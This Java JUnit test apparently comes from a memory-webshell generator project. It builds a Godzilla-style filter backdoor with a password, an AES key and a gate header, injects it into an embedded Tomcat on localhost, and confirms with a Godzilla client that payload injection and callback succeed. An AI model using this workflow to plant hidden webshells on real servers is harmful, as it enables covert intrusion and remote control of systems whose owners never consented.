package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.ClassDefiner;
import org.apache.catalina.startup.Tomcat;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 使用期验证：生成 Godzilla HW Filter，跑注入器挂到内嵌 Tomcat，用仓库内的哥斯拉协议客户端连接。
 * <p>
 * 仓库客户端只实现 {@code JAVA_AES_BASE64}，其余加密器由本地 godzilla-cli 矩阵验证
 * （见模块文档与 LAB 记录）。
 *
 * @author ReaJason
 */
class GodzillaHwEmbeddedTomcatTest {

    private static final String PASS = "passHwFilter";
    private static final String KEY = "keyHwFilter";
    private static final String HEADER_NAME = "X-Gate";
    private static final String HEADER_VALUE = "test-gate";

    @TempDir
    Path baseDir;

    private Tomcat tomcat;
    private String url;

    @BeforeEach
    void startTomcat() throws Exception {
        Files.createDirectories(baseDir.resolve("webapp"));
        tomcat = new Tomcat();
        tomcat.setBaseDir(baseDir.resolve("tomcat").toString());
        tomcat.setPort(0);
        tomcat.getConnector();
        tomcat.addWebapp("", baseDir.resolve("webapp").toString());
        tomcat.start();
        url = "http://127.0.0.1:" + tomcat.getConnector().getLocalPort();
    }

    @AfterEach
    void stopTomcat() throws Exception {
        if (tomcat != null) {
            tomcat.stop();
            tomcat.destroy();
        }
    }

    @Test
    void filterAesBase64() throws Exception {
        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(ShellTool.GodzillaHw)
                        .shellType(ShellType.FILTER)
                        .build(),
                InjectorConfig.builder().urlPattern("/*").build(),
                GodzillaHwConfig.builder()
                        .pass(PASS)
                        .key(KEY)
                        .headerName(HEADER_NAME)
                        .headerValue(HEADER_VALUE)
                        .cryption(GodzillaHwCryption.JAVA_AES_BASE64)
                        .build());

        // 与集成测试一致：生成物是注入器，newInstance 后由它自己找到容器 context 完成注入
        ClassDefiner.defineClass(result.getInjectorBytes()).getDeclaredConstructor().newInstance();

        try (GodzillaManager manager = GodzillaManager.builder()
                .entrypoint(url + "/test")
                .pass(PASS)
                .key(KEY)
                .header(HEADER_NAME, HEADER_VALUE)
                .build()) {
            assertTrue(manager.start(), "payload class 注入失败");
            assertTrue(manager.test(), "payload 调用没有回显");
        }
    }
}
